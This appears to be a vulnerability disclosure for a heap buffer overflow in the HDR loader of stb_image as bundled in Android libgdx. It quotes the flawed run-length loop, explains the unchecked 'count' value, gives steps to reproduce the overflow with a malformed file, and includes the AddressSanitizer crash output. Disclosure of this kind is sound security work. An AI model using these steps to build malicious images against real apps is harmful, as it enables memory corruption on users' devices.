Android libgdx stbi__hdr_load() heap overflow


static float *stbi__hdr_load(stbi__context *s, int *x, int *y, int *comp, int req_comp)
{
...
...
         len <<= 8;
[1]      len |= stbi__get8(s);
         if (len != width) { STBI_FREE(hdr_data); STBI_FREE(scanline); return stbi__errpf("invalid decoded scanline length", "corrupt HDR"); }
         if (scanline == NULL) scanline = (stbi_uc *) stbi__malloc(width * 4);

         for (k = 0; k < 4; ++k) {
            i = 0;
            while (i < width) {
[2]            count = stbi__get8(s);
               if (count > 128) {
                  // Run
                  value = stbi__get8(s);
                  count -= 128;
                  for (z = 0; z < count; ++z)
                     scanline[i++ * 4 + k] = value;
               } else {
                  // Dump
[3]               for (z = 0; z < count; ++z)
                     scanline[i++ * 4 + k] = stbi__get8(s);
               }
            }


We control the values of 'len' and 'count' variables ,see lines #1, #2.
The value of 'count' is not checked against 'len', so if we set 'count' to be
greater than 'len', heap overflow occur on loop #3.

How to test:

1) compile test app t1.c

$ cp t1.c external/libgdx/gdx/jni/gdx2
$ cd external/libgdx/gdx/jni/gdx2
$ clang -O1  -fsanitize=address -fno-omit-frame-pointer  -o t1a t1.c gdx2d.c  -m32 -I. -DNOJNI=1 -DSTBI_ONLY_HDR=1 -lm -g

2) generate malformed hdr file:
$ ./gen.py

3) run t1a
$./t1a 1.bin

reading file 1.bin, 1053 bytes
=================================================================
==10937==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf5800c00 at pc 0x80d183d bp 0xff8952d8 sp 0xff8952d0
WRITE of size 1 at 0xf5800c00 thread T0
    #0 0x80d183c in stbi__hdr_load /dist/src/android/libgdx/gdx2d/./stb_image.h:6057
    #1 0x80d2476 in stbi__load_main /dist/src/android/libgdx/gdx2d/./stb_image.h:967
    #2 0x80caf43 in stbi__load_flip /dist/src/android/libgdx/gdx2d/./stb_image.h:983
    #3 0x80cb1a7 in stbi_load_from_memory /dist/src/android/libgdx/gdx2d/./stb_image.h:1072
    #4 0x80cc546 in gdx2d_load /dist/src/android/libgdx/gdx2d/gdx2d.c:226
    #5 0x80cac17 in main /dist/src/android/libgdx/gdx2d/t1.c:34
    #6 0xf74bcaf2 (/lib/i386-linux-gnu/libc.so.6+0x19af2)
    #7 0x80ca9d4 in _start (/dist/src/android/libgdx/gdx2d/t1a+0x80ca9d4)

0xf5800c00 is located 0 bytes to the right of 32-byte region [0xf5800be0,0xf5800c00)
allocated by thread T0 here:
    #0 0x80b3601 in __interceptor_malloc (/dist/src/android/libgdx/gdx2d/t1a+0x80b3601)
    #1 0x80d1cfd in stbi__malloc /dist/src/android/libgdx/gdx2d/./stb_image.h:903
    #2 0x80d1554 in stbi__hdr_load /dist/src/android/libgdx/gdx2d/./stb_image.h:6042
    #3 0x80d2476 in stbi__load_main /dist/src/android/libgdx/gdx2d/./stb_image.h:967
    #4 0x80caf43 in stbi__load_flip /dist/src/android/libgdx/gdx2d/./stb_image.h:983
    #5 0x80cb1a7 in stbi_load_from_memory /dist/src/android/libgdx/gdx2d/./stb_image.h:1072
    #6 0x80cc546 in gdx2d_load /dist/src/android/libgdx/gdx2d/gdx2d.c:226
    #7 0x80cac17 in main /dist/src/android/libgdx/gdx2d/t1.c:34
    #8 0xf74bcaf2 (/lib/i386-linux-gnu/libc.so.6+0x19af2)

SUMMARY: AddressSanitizer: heap-buffer-overflow /dist/src/android/libgdx/gdx2d/./stb_image.h:6057 stbi__hdr_load
Shadow bytes around the buggy address:
  0x3eb00130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3eb00140: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3eb00150: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3eb00160: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3eb00170: fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00
=>0x3eb00180:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3eb00190: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3eb001a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3eb001b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3eb001c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3eb001d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:     fa
  Heap right redzone:    fb
  Freed heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==10937==ABORTING

